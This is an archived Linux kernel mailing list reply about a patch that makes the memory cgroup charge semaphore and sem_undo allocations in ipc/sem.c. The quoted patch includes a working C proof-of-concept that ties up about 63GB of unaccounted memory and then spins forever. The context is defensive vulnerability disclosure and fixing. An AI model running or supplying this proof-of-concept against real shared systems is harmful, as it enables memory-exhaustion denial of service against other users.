Return-Path: <cgroups-owner@vger.kernel.org>
X-Original-To: lists+cgroups@lfdr.de
Delivered-To: lists+cgroups@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id CCF7A3CA390
	for <lists+cgroups@lfdr.de>; Thu, 15 Jul 2021 19:05:57 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S229728AbhGORIu (ORCPT <rfc822;lists+cgroups@lfdr.de>);
        Thu, 15 Jul 2021 13:08:50 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:32772 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S229566AbhGORIt (ORCPT
        <rfc822;cgroups@vger.kernel.org>); Thu, 15 Jul 2021 13:08:49 -0400
Received: from mail-lf1-x132.google.com (mail-lf1-x132.google.com [IPv6:2a00:1450:4864:20::132])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 31B41C06175F
        for <cgroups@vger.kernel.org>; Thu, 15 Jul 2021 10:05:56 -0700 (PDT)
Received: by mail-lf1-x132.google.com with SMTP id v6so11117762lfp.6
        for <cgroups@vger.kernel.org>; Thu, 15 Jul 2021 10:05:56 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
         :cc;
        bh=oseTPKEuU4SU0H2DJsSeCJ4qHMH8gCDE013mBDWTIw4=;
        b=u7l8zfwriNOzshaE6JUVJlf6jSIxSa+Cs6G3xzg5HCpwmauKGG3SW/2UU3Q3LF2Z9z
         mbJASEhoUQ6QA0bhenrLEG51r1NvbAgNYsguojeiplU+3RQVDylPTuFWJdVA3GUbzqTX
         y3AteLNsHxyqws6XPkca1Dsn8qfkcv4Sjt4iayg8oE1blv5nmM8yRnCauU0oQF6aGhWR
         IL89h/0Xr/mS1RFz1BMQvJJUNwG5yV16uhlxG3qRINL7pu3ZPD1SjhAeJ3pPSlMj4mGs
         y0JmOBEonbiTggUw6zkRm2R6fPYI3XMPHlDNW1W6LF2oYPNtJbdH1ppoS+YZ/cjws8LJ
         qwyQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to:cc;
        bh=oseTPKEuU4SU0H2DJsSeCJ4qHMH8gCDE013mBDWTIw4=;
        b=gbMOtFZACAMrxdgHDCOpy2GU2XR1fikTARDvNz6m46imZrjzOf7SRwaMwSIwFrnGS/
         w+MiUq8qqs+QrypG84OOTJWnJCl6Srr6UMIY5kexZXB2p02OvlRPav2xqOKim5Euwzc8
         HnQ071V4yOChnjQMgNLLY6+BeYzNoUrzhOiotdqAHr1icD+dpAdLr9k5G4Cxv7mmgfkm
         AdJAx1GicjBh0tb0q1nG4SJqrh0BosRDqfZ88trTkHD8DxddOarC35OAVunMBsdpqBzs
         Y4r85b+k9s1F4Nc++zgjpkmBdCQTHrREk455ii25PvlPMD4QMry6doqjPj9dOQ2CQy0z
         vU3Q==
X-Gm-Message-State: AOAM532ntkhyUPaMsNNfeeDviBLqSFAwSUqBPvpRT/2dkSOVTsYBth6D
        v60KjV0koap/e2Xf9KdGS10bi89C6GgFxcEkxt+f2w==
X-Google-Smtp-Source: ABdhPJx2c4viqlDkUmTTpXxRJbnXQGeRxfgn4kStUB/KY45AURbAjEh8bw0tgi5VF7ng8tzvLQx3yKMQGgUws6fn0Pc=
X-Received: by 2002:a19:ad4d:: with SMTP id s13mr4182972lfd.432.1626368754163;
 Thu, 15 Jul 2021 10:05:54 -0700 (PDT)
MIME-Version: 1.0
References: <1626333284-1404-1-git-send-email-nglaive@gmail.com>
In-Reply-To: <1626333284-1404-1-git-send-email-nglaive@gmail.com>
From:   Shakeel Butt <shakeelb@google.com>
Date:   Thu, 15 Jul 2021 10:05:42 -0700
Message-ID: <CALvZod4-Vh4O4-PN661jqicSg95GPf87nv10xAYr1yG6oZQk8A@mail.gmail.com>
Subject: Re: [PATCH] memcg: charge semaphores and sem_undo objects
To:     Yutian Yang <nglaive@gmail.com>, Vasily Averin <vvs@virtuozzo.com>
Cc:     Michal Hocko <mhocko@kernel.org>,
        Johannes Weiner <hannes@cmpxchg.org>,
        Vladimir Davydov <vdavydov.dev@gmail.com>,
        Cgroups <cgroups@vger.kernel.org>, Linux MM <linux-mm@kvack.org>,
        shenwenbo@zju.edu.cn
Content-Type: text/plain; charset="UTF-8"
Precedence: bulk
List-ID: <cgroups.vger.kernel.org>
X-Mailing-List: cgroups@vger.kernel.org

+Vasily Averin

On Thu, Jul 15, 2021 at 12:15 AM Yutian Yang <nglaive@gmail.com> wrote:
>
> This patch adds accounting flags to semaphores and sem_undo allocation
> sites so that kernel could correctly charge these objects.
>
> A malicious user could take up more than 63GB unaccounted memory under
> default sysctl settings by exploiting the unaccounted objects. She could
> allocate up to 32,000 unaccounted semaphore sets with up to 32,000
> unaccounted semaphore objects in each set. She could further allocate one
> sem_undo unaccounted object for each semaphore set.
>
> The following code shows a PoC that takes ~63GB unaccounted memory, while
> it is charged for only less than 1MB memory usage. We evaluate the PoC on
> QEMU x86_64 v5.2.90 + Linux kernel v5.10.19 + Debian buster.
>
> /*------------------------- POC code ----------------------------*/
> #define _GNU_SOURCE
> #include <sys/types.h>
> #include <sys/ipc.h>
> #include <sys/sem.h>
> #include <sys/stat.h>
> #include <time.h>
> #include <stdint.h>
> #include <stdlib.h>
> #include <unistd.h>
> #include <stdio.h>
> #include <sched.h>
>
> #define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
>                         } while (0)
>
> int main(int argc, char *argv[]) {
>   int err, semid;
>   struct sembuf sops;
>   for (int i = 0; i < 31200; ++i) {
>     semid = semget(IPC_PRIVATE, 31200, IPC_CREAT);
>     if (semid == -1) {
>       errExit("semget");
>     }
>     sops.sem_num = 0;
>     sops.sem_op = 1;
>     sops.sem_flg = SEM_UNDO;
>     err = semop(semid, &sops, 1);
>     if (err == -1) {
>       errExit("semop");
>     }
>   }
>   while(1);
>   return 0;
> }
> /*-------------------------- end --------------------------------*/
>
> Thanks!
>
> Yutian Yang,
> Zhejiang University
>
> Signed-off-by: Yutian Yang <nglaive@gmail.com>

Thanks for the patch Yutian. I remember patch from Vasily regarding
memcg charging of similar objects.

Vasily, what's the status of your patch?

> ---
>  ipc/sem.c | 4 ++--
>  1 file changed, 2 insertions(+), 2 deletions(-)
>
> diff --git a/ipc/sem.c b/ipc/sem.c
> index f6c30a85d..6860de0b1 100644
> --- a/ipc/sem.c
> +++ b/ipc/sem.c
> @@ -511,7 +511,7 @@ static struct sem_array *sem_alloc(size_t nsems)
>         if (nsems > (INT_MAX - sizeof(*sma)) / sizeof(sma->sems[0]))
>                 return NULL;
>
> -       sma = kvzalloc(struct_size(sma, sems, nsems), GFP_KERNEL);
> +       sma = kvzalloc(struct_size(sma, sems, nsems), GFP_KERNEL_ACCOUNT);
>         if (unlikely(!sma))
>                 return NULL;
>
> @@ -1935,7 +1935,7 @@ static struct sem_undo *find_alloc_undo(struct ipc_namespace *ns, int semid)
>         rcu_read_unlock();
>
>         /* step 2: allocate new undo structure */
> -       new = kzalloc(sizeof(struct sem_undo) + sizeof(short)*nsems, GFP_KERNEL);
> +       new = kzalloc(sizeof(struct sem_undo) + sizeof(short)*nsems, GFP_KERNEL_ACCOUNT);
>         if (!new) {
>                 ipc_rcu_putref(&sma->sem_perm, sem_rcu_free);
>                 return ERR_PTR(-ENOMEM);
> --
> 2.25.1
>
